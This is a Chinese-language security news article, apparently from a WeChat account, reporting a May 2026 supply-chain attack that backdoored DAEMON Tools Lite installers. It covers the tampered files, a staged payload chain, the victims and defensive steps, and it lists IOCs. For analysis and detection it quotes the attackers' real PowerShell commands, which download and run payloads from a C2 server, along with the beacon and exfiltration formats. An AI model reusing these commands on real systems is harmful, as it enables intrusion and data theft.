---
title: 全球知名虚拟光驱软件DAEMON Tools遭供应链攻击
url: https://mp.weixin.qq.com/s/gd25qIPLQgLSkG2HjUwk9w
source: Doonsec's feed
date: 2026-05-05
fetch_date: 2026-05-06T05:06:28.433393
---

# 全球知名虚拟光驱软件DAEMON Tools遭供应链攻击

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ibO9kiauylaDrZ7zHoSDm8dxem9KTyaEOJsp4jtZAXpLSf2icd0yibnEibzxWiciamskasSEI3ROiclsXuo9Gk6PT0AywmoKdWicoF6Jb3oWf2DJpwwk/0?wx_fmt=jpeg)

# 全球知名虚拟光驱软件DAEMON Tools遭供应链攻击

黑鸟

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

2026 年 5 月 5 日，全球知名网络安全公司卡巴斯基发布重磅安全报告，披露了一起正在进行中的大规模供应链攻击事件。全球广泛使用的虚拟光驱软件 DAEMON Tools 官方安装包被植入恶意后门，攻击从 4 月 8 日开始持续至今，已有超过 100 个国家和地区的用户受到影响。

DAEMON Tools 是由拉脱维亚公司 AVB Disc Soft 开发的虚拟光驱软件，也是全球最受欢迎的磁盘映像工具之一。它能够创建和挂载各种格式的虚拟光盘映像文件，无需物理光驱即可访问光盘内容。

![](https://mmbiz.qpic.cn/mmbiz_png/ibO9kiauylaDqS5mkmRJteOxcTMGicuwu1KQzTmhunchibTwZQ8cvcsoP1h19oDBQuTyKcdySFia8DrsKvcKJibHtBJHAZesY5CJNN7CzVO5tA41E/640?wx_fmt=png&from=appmsg)

该软件拥有多个版本，包括免费的 DAEMON Tools Lite 和功能更强大的 DAEMON Tools Ultra、DAEMON Tools Pro 等。凭借其易用性和广泛的格式支持，DAEMON Tools 在个人用户和企业环境中都拥有庞大的装机量，全球累计下载量超过数亿次。

卡巴斯基研究人员在 2026 年 5 月初发现，DAEMON Tools 官方网站分发的安装程序已被恶意篡改。攻击者成功入侵了软件的开发或分发渠道，在合法安装包中植入了恶意代码。

**受影响的软件版本范围为 12.5.0.2421 至 12.5.0.2434**。所有在 2026 年 4 月 8 日之后从官方网站下载并安装这些版本的用户，都可能已经被植入后门。

值得警惕的是，被篡改的二进制文件仍然带有 DAEMON Tools 开发者的合法数字签名。这意味着大多数安全软件和操作系统的安全机制会将其视为可信程序，从而绕过常规检测。

截至报告发布时，这起供应链攻击仍在活跃进行中。卡巴斯基已联系 DAEMON Tools 开发商 AVB Disc Soft，协助其采取措施修复攻击造成的影响。

##

### 被篡改的核心文件

###

攻击者修改了 DAEMON Tools 安装目录中的三个关键二进制文件：

* DTHelper.exe
* DiscSoftBusServiceLite.exe
* DTShellHlp.exe

这些文件通常位于`C:\Program Files\DAEMON Tools Lite`目录下。每当系统启动时，这些文件会自动运行，同时激活植入其中的后门程序。

### 初始后门通信机制

###

后门被植入在负责初始化 CRT 运行时环境的启动代码中。它会在一个独立的线程中运行，持续向以下恶意服务器发送 GET 请求：

https://env-check.daemontools[.]cc/2032716822411?s=<full computer name>

这个恶意域名采用了 typosquatting 技术，模仿合法的`daemon-tools[.]cc`域名，具有很强的欺骗性。WHOIS 查询显示，该恶意域名注册于 2026 年 3 月 27 日，比攻击开始时间早约一周。

恶意服务器会根据请求返回 shell 命令，这些命令通过`cmd.exe`进程执行。命令的通用模板如下：

cmd.exe /c powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/<hexadecimal string>','C:\Windows\Temp\<filename>.exe')"&& %TEMP%\<filename> <arguments> &&del %TEMP%\<filename>.exe

可以看出，攻击者利用 PowerShell 下载并执行后续 payload，执行完成后立即删除文件以清除痕迹。

### 第一阶段：信息收集器

###

攻击者首先向大多数受感染机器部署了一个信息收集器 payload，文件名为`envchk.exe`，SHA1 哈希值为`2d4eb55b01f59c62c6de9aacba9b47267d398fe4`。

这是一个.NET 可执行文件。信息收集器会收集以下系统数据：

* 第一个非零的 MAC 地址
* 主机名
* DNS 域名
* 运行中的进程列表（以分号分隔）
* 已安装软件列表（以分号分隔）
* 系统区域设置

收集到的数据会通过 POST 请求发送到 C2 服务器`http://38.180.107[.]76/09505aca4f538bd`，请求体格式为：

a=<MAC address>&b=<hostname>&c=<DNS domain name>&d=<process list>&e=<software list>&f=<locale>

### 第二阶段：极简后门

###

信息收集器的作用是对受感染机器进行初步筛选和画像。只有约十几台机器收到了更高级的 payload，这表明此次攻击具有明确的针对性。

其中一种高级 payload 是一个极简后门。它通过以下命令部署：

cmd.exe /c powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107.76/b3593ac2edb34f4d4d','C:\Windows\Temp\cdg.exe')"&&powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107.76/368b1365bd9176b359','%TEMP%\cdg.tmp')"&&%TEMP%\cdg.exe schedsvc.dll %TEMP%\cdg.tmp first\_match&&del %TEMP%\cdg.exe&&del %TEMP%\cdg.tmp

这个命令会下载两个文件：`cdg.exe`和`cdg.tmp`。其中`cdg.exe`是一个 shellcode 加载器，它会使用 RC4 算法解密`cdg.tmp`文件，密钥为命令行参数中的`first_match`，然后在内存中执行解密后的 shellcode。

这个极简后门会向以下 URL 发送 POST 心跳包：

http://38.180.107[.]76/79437f5edda13f9c066/version/check

它具备以下核心功能：

* 下载任意文件
* 执行 shell 命令
* 在内存中执行 shellcode payload

研究人员还发现了一些包含拼写错误的部署命令。例如将 "cipher" 拼写为 "chiper"，将 "crypto.dll" 写成 "rypto.dll"。这些错误导致后门无法正常启动，同时也表明部分攻击操作是攻击者手动执行的。

### 第三阶段：QUIC RAT

###

在少数受攻击的机器上，攻击者利用极简后门部署了一个更为复杂的远程访问木马，卡巴斯基将其命名为 QUIC RAT。目前仅发现一家位于俄罗斯的教育机构受到了这个 RAT 的攻击。

QUIC RAT 使用 C++ 编写，采用控制流扁平化技术进行混淆，并静态链接了 WolfSSL 库。它还在`.data`节中包含了合法的`msquic.dll`库文件。

这个 RAT 支持多种 C2 通信协议，包括 HTTP、UDP、TCP、WSS、QUIC、DNS 和 HTTP/3。研究人员发现它能够将 payload 注入到`notepad.exe`和`conhost.exe`进程中，以实现隐蔽执行。目前对 QUIC RAT 的分析仍在进行中。

## 受害者分布与攻击目标

##

自 2026 年 4 月 8 日以来，卡巴斯基遥测系统已监测到数千次通过 DAEMON Tools 进行的感染尝试。受害者遍布全球 100 多个国家和地区，其中大多数位于俄罗斯、巴西、土耳其、西班牙、德国、法国、意大利和中国。

统计数据显示，10% 的受感染系统属于企业和组织。攻击者向绝大多数受感染机器仅部署了信息收集器，而更复杂的后门 payload 仅出现在十几台特定机器上。这些机器分属俄罗斯、白俄罗斯和泰国的政府、科研、制造和零售行业。

这种攻击模式清晰地表明，攻击者利用大规模供应链感染作为入口，然后通过信息收集筛选出高价值目标进行针对性攻击。目前尚不清楚攻击者的最终目的是网络间谍活动还是勒索攻击。

## 防护建议与应对措施

##

1. **立即检查 DAEMON Tools 版本**

   如果安装的是 12.5.0.2421 至 12.5.0.2434 之间的版本，应立即卸载并从官方网站下载最新的安全版本。
2. **扫描系统是否存在恶意文件**

   检查以下路径是否存在可疑文件：

* `C:\Program Files\DAEMON Tools Lite\`

  下的三个被篡改文件
* `C:\Windows\Temp\envchk.exe`
* `C:\Windows\Temp\cdg.exe`
* `C:\Windows\Temp\cdg.tmp`

3. **监控网络流量**

   检查是否有发往`env-check.daemontools[.]cc`和`38.180.107[.]76`的异常网络连接。
4. **启用端点检测与响应**

   EDR 解决方案能够有效检测和阻止此类供应链攻击。
5. **遵循零信任安全原则**

   不要盲目信任任何软件，即使是来自官方渠道的知名软件也可能被篡改。

##

此次 DAEMON Tools 供应链攻击再次证明了软件供应链安全的脆弱性。攻击者能够在不被发现的情况下篡改知名软件的官方安装包，并利用合法数字签名绕过安全检测。攻击持续了近一个月才被发现，这与 2023 年的 3CX 供应链攻击情况类似。

值得注意的是，2026 年以来供应链攻击事件呈现明显上升趋势。1 月的 eScan、2 月的 Notepad++、4 月的 CPU-Z，再到 5 月的 DAEMON Tools，平均每月都有一起重大供应链攻击事件被披露。

这一趋势表明，广泛使用且受信任的应用程序已成为攻击者的首选攻击向量。对于企业和个人用户而言，建立完善的软件供应链安全管理体系，实施严格的软件白名单策略，以及持续监控系统异常行为，已成为网络安全防护的必要措施。

## IOC

### 受感染的 DAEMON Tools Lite 安装程序 SHA1 哈希

* 9ccd769624de98eeeb12714ff1707ec4f5bf196d (12.5.0.2421)
* 50d47adb6dd45215c7cb4c68bae28b129ca09645 (12.5.0.2422)
* 0c1d3da9c7a651ba40b40e12d48ebd32b3f31820 (12.5.0.2423)
* 28b72576d67ae21d9587d782942628ea46dcc870 (12.5.0.2424)
* 46b90bf370e60d61075d3472828fdc0b85ab0492 (12.5.0.2430)
* 6325179f442e5b1a716580cd70dea644ac9ecd18 (12.5.0.2431)
* bd8fbb5e6842df8683163adbd6a36136164eac58 (12.5.0.2433)
* 15ed5c3384e12fe4314ad6edbd1dcccf5ac1ee29 (12.5.0.2434)

### 被修改的 DiscSoftBusServiceLite.exe SHA1 哈希

* 524d2d92909eef80c406e87a0fc37d7bb4dadc14
* 427f1728682ebc7ffe3300fef67d0e3cb6b62948
* 8e7eb0f5ac60dd3b4a9474d2544348c3bda48045
* 00e2df8f42d14072e4385e500d4669ec783aa517
* aea55e42c4436236278e5692d3dcbcbe5fe6ce0b
* 0456e2f5f56ec8ed16078941248e7cbba9f1c8eb
* 9a09ad7b7e9ff7a465aa1150541e231189911afb
* 8d435918d304fc38d54b104a13f2e33e8e598c82
* 64462f751788f529c1eb09023b26a47792ecdc54

### 恶意文件 SHA1 哈希

* envchk.exe: 2d4eb55b01f59c62c6de9aacba9b47267d398fe4
* piyu.exe: 9dbfc23ebf36b3c0b56d2f93116abb32656c42e4
* piyu.exe: 295ce86226b933e7262c2ce4b36bdd6c389aaaef

### 恶意 C2 服务器

* env-check.daemontools[.]cc
* 38.180.107[.]76

https://securelist.com/tr/daemon-tools-backdoor/119654/

往期：

[以色列电信如何被利用来追踪全球用户](https://mp.weixin.qq.com/s?__biz=MzAxOTM1MDQ1NA==&mid=2451186617&idx=1&sn=3d0a32fc9a8cbe1600bdace7b962249b&scene=21#wechat_redirect)

[NSA与AT&T的秘密监控计划：641A房间的真相](https://mp.weixin.qq.com/s?__biz=MzAxOTM1MDQ1NA==&mid=2451186611&idx=1&sn=11706d87caa7f5d3e74e445766f2af6f&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibO9kiauylaDqicDvERLTuy6Yo2PUS5sCSLCWBlXcichCYke51phlZqJvemVicckicq5cDX67WMuDvDmWX3HQaiaFCeKnMRuEVv2jsQCv90kc27HwE/640?wx_fmt=jpeg&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/V9abY6oHTkqrJPe3BMSmUuUaQMPJDnWTSrtbtXBAZSMfj0iaxiaMvM6cnIDqLXBbescHHicaricGUU0tHjJ4BqISKw/0?wx_fmt=png)

黑鸟

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/V9abY6oHTkqrJPe3BMSmUuUaQMPJDnWTSrtbtXBAZSMfj0iaxiaMvM6cnIDqLXBbescHHicaricGUU0tHjJ4BqISKw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过